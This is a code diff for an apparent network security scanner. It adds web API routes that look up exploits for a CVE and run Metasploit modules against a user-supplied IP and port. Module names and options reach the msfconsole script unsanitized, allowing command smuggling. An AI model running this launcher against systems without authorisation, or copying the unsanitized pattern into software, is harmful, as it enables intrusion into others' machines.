+            all_pocs = list(dict.fromkeys(raw_github_urls + nvd_poc_urls))
+            if all_pocs and not session_opened:
+                emit(f'All PoC / exploit references ({len(all_pocs)} total):')
+                for url in all_pocs[:15]:
+                    if url in resolved_urls:
+                        href, title = resolved_urls[url]
+                        label = f' — {title}' if title else ''
+                        emit(f'  GitHub: {href}{label}')
+                    else:
+                        emit(f'  {url}')
+
+            # ── Final status ───────────────────────────────────────────────
+            has_intel = bool(all_edb_ids or all_pocs or tried_any)
+            if session_opened:
+                emit(f'Session opened on {target_ip} — {cve} exploitation succeeded!', 'success', 'complete')
+            elif has_intel:
+                emit('Exploitation attempt complete. No session obtained — review refs above.', 'warning', 'complete')
+            else:
+                emit(
+                    'No exploitation tools installed (msfconsole / searchsploit). '
+                    'Install Metasploit Framework to attempt automated exploitation.',
+                    'warning', 'complete'
+                )
+
+            shared_data.ragnarstatustext = 'IDLE'
+            shared_data.ragnarstatustext2 = ''
+            broadcast_status_update()
+
+        import threading
+        threading.Thread(target=_run_exploit, daemon=True).start()
+        return jsonify({'success': True, 'message': f'Exploit attempt for {cve} started on {target_ip}:{target_port}'})
+
+    except Exception as e:
+        logger.error(f"Error in execute_cve_exploit: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
 def start_orchestrator_automation():
     """Start the orchestrator thread to enable automation."""
     try:
@@ -17658,6 +18120,289 @@ def airsnitch_install_log():
     except Exception as exc:
         logger.error(f"airsnitch_install_log error: {exc}")
         return jsonify({'success': False, 'error': str(exc)}), 500
+
+
+# ============================================================================
+# EXPLOIT LAUNCHER API
+# ============================================================================
+
+_exploit_jobs: dict = {}
+_exploit_jobs_lock = threading.Lock()
+
+
+def _run_msf_exploit_bg(job_id: str, module: str, target_ip: str, target_port: str, extra_options: dict):
+    import tempfile
+    try:
+        rc_lines = [f"use {module}", f"set RHOSTS {target_ip}"]
+        if target_port:
+            rc_lines.append(f"set RPORT {target_port}")
+        for k, v in (extra_options or {}).items():
+            rc_lines.append(f"set {k} {v}")
+        rc_lines += ["run", "exit -y"]
+
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False, dir='/tmp') as f:
+            f.write('\n'.join(rc_lines) + '\n')
+            rc_path = f.name
+
+        proc = subprocess.Popen(
+            ['msfconsole', '-q', '-r', rc_path],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        output_lines: list = []
+        for line in proc.stdout:
+            output_lines.append(line)
+            with _exploit_jobs_lock:
+                _exploit_jobs[job_id]['output'] = ''.join(output_lines[-300:])
+        proc.wait(timeout=300)
+        try:
+            os.unlink(rc_path)
+        except Exception:
+            pass
+        with _exploit_jobs_lock:
+            _exploit_jobs[job_id].update({'done': True, 'exit_code': proc.returncode})
+    except Exception as exc:
+        with _exploit_jobs_lock:
+            _exploit_jobs[job_id].update({'done': True, 'error': str(exc)})
+
+
+@app.route('/api/exploit/lookup', methods=['POST'])
+def exploit_lookup():
+    data = request.get_json() or {}
+    cve = re.sub(r'\s+', '', (data.get('cve') or '')).upper()
+    service = (data.get('service') or '').strip()
+    vuln_text = (data.get('vuln_text') or '')
+
+    if not cve and not service:
+        return jsonify({'error': 'cve or service required'}), 400
+
+    has_exploit_marker = '*EXPLOIT*' in vuln_text.upper()
+
+    # Parse exploit references already present in the scan text
+    scan_refs = []
+    seen_urls: set = set()
+
+    # EDB IDs in text
+    for eid in re.findall(r'EDB-(\d+)', vuln_text, re.IGNORECASE):
+        url = f'https://www.exploit-db.com/exploits/{eid}'
+        if url not in seen_urls:
+            seen_urls.add(url)
+            scan_refs.append({'title': f'ExploitDB #{eid}', 'url': url, 'type': 'exploitdb', 'confirmed': True})
+
+    # MSF modules
+    for mod in re.findall(r'MSF:([\w/]+)', vuln_text, re.IGNORECASE):
+        url = f'https://www.rapid7.com/db/modules/{mod}'
+        scan_refs.append({'title': f'Metasploit: {mod}', 'url': url, 'type': 'metasploit', 'confirmed': True})
+
+    # All URLs in vuln text — parse by vulners sub-type for useful labels
+    for url in re.findall(r'https?://\S+', vuln_text):
+        url = url.rstrip('.,;)')
+        if url in seen_urls:
+            continue
+        seen_urls.add(url)
+        if 'exploit-db.com/exploits/' in url:
+            eid = url.split('/exploits/')[-1].strip('/')
+            scan_refs.append({'title': f'ExploitDB #{eid}', 'url': url, 'type': 'exploitdb', 'confirmed': True})
+        elif 'vulners.com/exploitdb/' in url:
+            raw_id = url.split('/exploitdb/')[-1].strip('/').replace('EDB-', '')
+            direct = f'https://www.exploit-db.com/exploits/{raw_id}'
+            scan_refs.append({'title': f'ExploitDB #{raw_id}', 'url': direct, 'type': 'exploitdb', 'confirmed': True})
+        elif 'vulners.com/githubexploit/' in url:
+            scan_refs.append({'title': 'GitHub PoC (vulners)', 'url': url, 'type': 'github', 'confirmed': True})
+        elif 'vulners.com/packetstorm/' in url or 'packetstormsecurity.com' in url:
+            scan_refs.append({'title': 'PacketStorm Exploit', 'url': url, 'type': 'packetstorm', 'confirmed': True})
+        elif 'vulners.com/seebug/' in url:
+            scan_refs.append({'title': 'SeeBug Exploit', 'url': url, 'type': 'seebug', 'confirmed': True})
+        elif 'vulners.com' in url and '/cve/' not in url.lower():
+            scan_refs.append({'title': 'Vulners Reference', 'url': url, 'type': 'vulners', 'confirmed': True})
+        elif 'rapid7.com' in url:
+            scan_refs.append({'title': 'Rapid7 / Metasploit', 'url': url, 'type': 'metasploit', 'confirmed': True})
+        elif 'github.com' in url:
+            scan_refs.append({'title': 'GitHub Reference', 'url': url, 'type': 'github', 'confirmed': False})
+
+    # NVD API lookup — description, CVSS, and any ExploitDB links NIST tagged
+    nvd_info: dict = {}
+    if cve and re.match(r'^CVE-\d{4}-\d+$', cve):
+        try:
+            import requests as _req
+            nvd_resp = _req.get(
+                f'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}',
+                timeout=8,
+                headers={'User-Agent': 'Ragnar-Security-Scanner/1.0'}
+            )
+            if nvd_resp.status_code == 200:
+                nvd_raw = nvd_resp.json()
+                entries = nvd_raw.get('vulnerabilities', [])
+                if entries:
+                    cve_entry = entries[0].get('cve', {})
+
+                    descs = cve_entry.get('descriptions', [])
+                    description = next((d['value'] for d in descs if d.get('lang') == 'en'), '')
+
+                    metrics = cve_entry.get('metrics', {})
+                    cvss_score = cvss_vector = cvss_severity = None
+                    for mk in ['cvssMetricV31', 'cvssMetricV30', 'cvssMetricV2']:
+                        if mk in metrics and metrics[mk]:
+                            m = metrics[mk][0]
+                            cd = m.get('cvssData', {})
+                            cvss_score = cd.get('baseScore')
+                            cvss_vector = cd.get('vectorString', '')
+                            cvss_severity = cd.get('baseSeverity') or m.get('baseSeverity', '')
+                            break
+
+                    weaknesses = cve_entry.get('weaknesses', [])
+                    cwe = None
+                    for w in weaknesses:
+                        for wd in w.get('description', []):
+                            if wd.get('lang') == 'en' and wd.get('value', '').startswith('CWE-'):
+                                cwe = wd['value']
+                                break
+                        if cwe:
+                            break
+
+                    nvd_exploit_refs = []
+                    for ref in cve_entry.get('references', []):
+                        ref_url = ref.get('url', '')
+                        ref_tags = ref.get('tags', [])
+                        if 'exploit-db.com/exploits/' in ref_url:
+                            eid = ref_url.split('/exploits/')[-1].strip('/')
+                            nvd_exploit_refs.append({'title': f'ExploitDB #{eid} (NVD)', 'url': ref_url, 'type': 'exploitdb'})
+                            if ref_url not in seen_urls:
+                                seen_urls.add(ref_url)
+                                scan_refs.append({'title': f'ExploitDB #{eid} (via NVD)', 'url': ref_url, 'type': 'exploitdb', 'confirmed': True})
+                        elif 'Exploit' in ref_tags and 'github.com' in ref_url:
+                            nvd_exploit_refs.append({'title': 'GitHub PoC (NVD)', 'url': ref_url, 'type': 'github'})
+                            if ref_url not in seen_urls:
+                                seen_urls.add(ref_url)
+                                scan_refs.append({'title': 'GitHub PoC (NVD)', 'url': ref_url, 'type': 'github', 'confirmed': True})
+
+                    nvd_info = {
+                        'description': description[:700] if description else '',
+                        'cvss_score': cvss_score,
+                        'cvss_vector': cvss_vector,
+                        'cvss_severity': (cvss_severity or '').upper(),
+                        'cwe': cwe,
+                        'exploit_refs': nvd_exploit_refs,
+                        'published': (cve_entry.get('published') or '')[:10],
+                    }
+        except Exception as nvd_err:
+            logger.debug(f"NVD lookup {cve}: {nvd_err}")
+            nvd_info = {'error': 'NVD lookup unavailable (no internet or rate-limited)'}
+
+    cve_links = []
+    if cve:
+        cve_links = [
+            {'name': 'NVD', 'url': f'https://nvd.nist.gov/vuln/detail/{cve}'},
+            {'name': 'MITRE', 'url': f'https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}'},
+            {'name': 'ExploitDB', 'url': f'https://www.exploit-db.com/search?cve={cve.replace("CVE-","")}'},
+            {'name': 'GitHub PoC', 'url': f'https://github.com/search?q={cve}&type=repositories'},
+            {'name': 'Vulners', 'url': f'https://vulners.com/search?query={cve}'},
+        ]
+
+    _svc_map = {
+        'netbios-ssn': 'smb', 'netbios': 'smb', 'microsoft-ds': 'smb',
+        'msrpc': 'smb', 'ms-wbt-server': 'rdp', 'rdp': 'rdp',
+        'ssh': 'ssh', 'ftp': 'ftp', 'smtp': 'smtp', 'imap': 'imap',
+        'pop3': 'pop3', 'http': 'apache', 'https': 'ssl',
+        'telnet': 'telnet', 'vnc': 'vnc', 'mysql': 'mysql',
+        'ms-sql-s': 'mssql', 'oracle': 'oracle', 'postgresql': 'postgresql',
+    }
+    search_service = _svc_map.get(service.lower(), service)
+
+    result = {
+        'searchsploit': [],
+        'metasploit': [],
+        'scan_refs': scan_refs,
+        'cve_links': cve_links,
+        'nvd_info': nvd_info,
+        'has_exploit_marker': has_exploit_marker,
+        'searchsploit_available': bool(shutil.which('searchsploit')),
+        'msf_available': bool(shutil.which('msfconsole')),
+    }
+
+    if result['searchsploit_available']:
+        try:
+            search_term = cve if cve else search_service
+            r = subprocess.run(
+                ['searchsploit', '--json', search_term],
+                capture_output=True, text=True, timeout=30
+            )
+            raw = json.loads(r.stdout)
+            result['searchsploit'] = [
+                {
+                    'title': e.get('Title', ''),
+                    'path': e.get('Path', ''),
+                    'type': e.get('Type', ''),
+                    'edb_id': e.get('EDB-ID', ''),
+                    'url': f"https://www.exploit-db.com/exploits/{e.get('EDB-ID', '')}" if e.get('EDB-ID') else '',
+                }
+                for e in raw.get('RESULTS_EXPLOIT', [])[:12]
+            ]
+        except Exception as exc:
+            result['searchsploit_error'] = str(exc)
+
+    if result['msf_available']:
+        try:
+            search_term = f"cve:{cve.replace('CVE-', '')}" if cve else service
+            r = subprocess.run(
+                ['msfconsole', '-q', '-x', f'search {search_term}; exit'],
+                capture_output=True, text=True, timeout=90
+            )
+            modules = []
+            for line in r.stdout.split('\n'):
+                stripped = line.strip()
+                if re.match(r'^\d+\s+\S+/\S+', stripped):
+                    parts = stripped.split()
+                    if len(parts) >= 2:
+                        modules.append({
+                            'name': parts[1],
+                            'rank': parts[3] if len(parts) > 3 else '',
+                            'description': ' '.join(parts[5:]) if len(parts) > 5 else '',
+                        })
+            result['metasploit'] = modules[:10]
+        except Exception as exc:
+            result['msf_error'] = str(exc)
+
+    return jsonify(result)
+
+
+@app.route('/api/exploit/run', methods=['POST'])
+def exploit_run():
+    data = request.get_json() or {}
+    module = (data.get('module') or '').strip()
+    target_ip = (data.get('target_ip') or '').strip()
+    target_port = (data.get('target_port') or '').strip()
+    extra_options = data.get('options') or {}
+
+    if not module or not target_ip:
+        return jsonify({'success': False, 'error': 'module and target_ip required'}), 400
+
+    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
+        return jsonify({'success': False, 'error': 'Invalid target IP address'}), 400
+
+    if not shutil.which('msfconsole'):
+        return jsonify({'success': False, 'error': 'msfconsole is not installed on this system'}), 503
+
+    job_id = str(uuid.uuid4())[:8]
+    with _exploit_jobs_lock:
+        _exploit_jobs[job_id] = {'output': 'Starting msfconsole...\n', 'done': False}
+
+    threading.Thread(
+        target=_run_msf_exploit_bg,
+        args=(job_id, module, target_ip, target_port, extra_options),
+        daemon=True
+    ).start()
+
+    return jsonify({'success': True, 'job_id': job_id})
+
+
+@app.route('/api/exploit/output/<job_id>', methods=['GET'])
+def exploit_output(job_id):
+    with _exploit_jobs_lock:
+        job = dict(_exploit_jobs.get(job_id) or {})
+    if not job:
+        return jsonify({'error': 'unknown job'}), 404
+    return jsonify(job)
 
 
 # ============================================================================
